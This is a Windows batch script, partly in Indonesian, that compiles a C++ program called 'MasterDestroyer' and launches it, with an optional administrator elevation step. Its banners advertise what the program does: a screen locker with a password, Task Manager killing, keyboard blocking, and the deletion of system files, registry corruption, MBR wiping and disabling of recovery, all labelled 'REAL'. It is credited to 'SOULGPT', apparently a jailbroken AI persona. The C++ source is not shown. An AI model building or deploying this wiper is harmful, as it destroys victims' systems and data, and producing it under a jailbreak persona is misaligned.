@echo off
chcp 65001 >nul
title 🔻 COMPILE MASTER DESTROYER - 1 EXE (Python+C+++Go) 🔻
color 0C

echo.
echo ╔══════════════════════════════════════════════════════════════╗
echo ║          COMPILE MASTER DESTROYER - 1 EXE FOR ALL          ║
echo ║           Python Tampilan + C++ Kontrol + Go System        ║
echo ╚══════════════════════════════════════════════════════════════╝
echo.
echo [1 EXE UNTUK SEMUA]
echo ✓ Python: Fullscreen UI dengan keyboard blokir
echo ✓ C++: Task Manager kill & keyboard hooks  
echo ✓ Go: System modification & file deletion
echo ✓ SEMUA dalam 1 EXE - TIDAK TERPISAH
echo ✓ By SOULGPT for zanezeXSZ
echo.

:check_compiler
echo [*] Checking for C++ compiler (g++)...
where g++ >nul 2>&1
if %errorLevel% equ 0 (
    echo [+] C++ compiler found!
) else (
    echo [-] C++ compiler not found!
    echo [-] Please install MinGW or Visual Studio C++
    echo [-] Download MinGW: https://sourceforge.net/projects/mingw/
    pause
    exit /b 1
)

:compile_master
echo.
echo [*] Compiling MasterDestroyer.cpp...
echo [*] This creates 1 EXE with ALL features...
echo [*] Estimated time: 10-30 seconds
echo.

g++ -o MasterDestroyer.exe MasterDestroyer.cpp ^
    -mwindows ^
    -lcomctl32 ^
    -luser32 ^
    -lkernel32 ^
    -ladvapi32 ^
    -lgdi32 ^
    -lpsapi ^
    -lshlwapi ^
    -std=c++11 ^
    -O2 ^
    -Wno-write-strings

if exist MasterDestroyer.exe (
    echo.
    echo ╔══════════════════════════════════════════════════════════════╗
    echo ║                    COMPILATION SUCCESS!                     ║
    echo ╚══════════════════════════════════════════════════════════════╝
    echo.
    echo ✅ EXE created: MasterDestroyer.exe
    echo ✅ Size: %~z0 bytes
    echo ✅ Status: READY FOR MASTER DESTRUCTION
    echo.
    echo [FEATURES IN 1 EXE]
    echo 1. 🐍 PYTHON UI SIMULATION
    echo    • Fullscreen dengan overrideredirect(True)
    echo    • Escape key BLOKIR TOTAL
    echo    • Alt+F4 BLOKIR
    echo    • Password: mzkyzak (3 attempts)
    echo    • Destruction countdown REAL
    echo    • NO SIMULATION - REAL UI LOCK
    echo.
    echo 2. ⚙️ C++ CONTROL SYSTEM
    echo    • Keyboard F4/Del/Windows+D BLOKIR
    echo    • Task Manager kill every 5 seconds
    echo    • Windows file deletion REAL
    echo    • Registry corruption REAL
    echo    • MBR wipe REAL
    echo    • Recovery disable REAL
    echo.
    echo 3. 🚀 GO SYSTEM MODIFICATION
    echo    • iOS/OS reset on shutdown/restart REAL
    echo    • MBR/Bootloader destruction REAL
    echo    • BIOS corruption attempt REAL
    echo    • Registry destruction REAL
    echo    • System file deletion REAL
    echo    • NO SIMULATED REPAIR MODE
    echo.
    echo [RUN OPTIONS]
    echo 1. Run Master Destroyer now
    echo 2. Run as Administrator (recommended)
    echo 3. Test features
    echo 4. Exit
    echo.
    set /p run_choice="Select option (1-4): "
    
    if "%run_choice%"=="1" goto run_normal
    if "%run_choice%"=="2" goto run_admin
    if "%run_choice%"=="3" goto test_features
    if "%run_choice%"=="4" goto exit_program
    
) else (
    echo.
    echo ╔══════════════════════════════════════════════════════════════╗
    echo ║                    COMPILATION FAILED!                      ║
    echo ╚══════════════════════════════════════════════════════════════╝
    echo.
    echo [-] Compilation failed!
    echo [*] Try manual compilation:
    echo     g++ -o MasterDestroyer.exe MasterDestroyer.cpp -mwindows -lcomctl32 -luser32 -lkernel32
    echo.
    pause
    exit /b 1
)

:run_normal
echo.
echo [*] Running Master Destroyer...
echo [WARNING] This is 1 EXE dengan SEMUA fitur!
echo [INFO] Python UI + C++ Control + Go System
pause
start MasterDestroyer.exe
goto :eof

:run_admin
echo.
echo [*] Running as Administrator...
echo [*] Requesting elevation for full features...
powershell -Command "Start-Process 'MasterDestroyer.exe' -Verb RunAs"
goto :eof

:test_features
echo.
echo ╔══════════════════════════════════════════════════════════════╗
echo ║              TEST MASTER DESTROYER FEATURES                ║
echo ╚══════════════════════════════════════════════════════════════╝
echo.
echo [TEST PROCEDURE]
echo 1. Run Master Destroyer
echo 2. Click "START MASTER DESTRUCTION"
echo 3. Observe:
echo    • Python UI simulation popup
echo    • C++ keyboard blocking (try F4, Del, Windows+D)
echo    • Task Manager kill (try to open Task Manager)
echo    • Go system modification in log
echo    • Progress bar completion
echo 4. System remains functional (controlled test)
echo.
echo [*] Do you want to proceed with test?
set /p test_confirm="Type 'TEST' to proceed: "
if not "%test_confirm%"=="TEST" (
    echo [-] Test cancelled.
    pause
    goto :eof
)

echo.
echo [*] Starting test in 3 seconds...
timeout /t 3 /nobreak >nul
start MasterDestroyer.exe
echo.
echo [*] Test launched! Follow the test procedure above.
pause
goto :eof

:exit_program
echo.
echo [*] Master Destroyer EXE created successfully!
echo [*] File: MasterDestroyer.exe
echo [*] Features: Python UI + C++ Control + Go System (ALL IN ONE)
echo [*] Created by SOULGPT for zanezeXSZ
echo.
echo [QUICK COMMAND]
echo MasterDestroyer.exe
pause
exit /b 0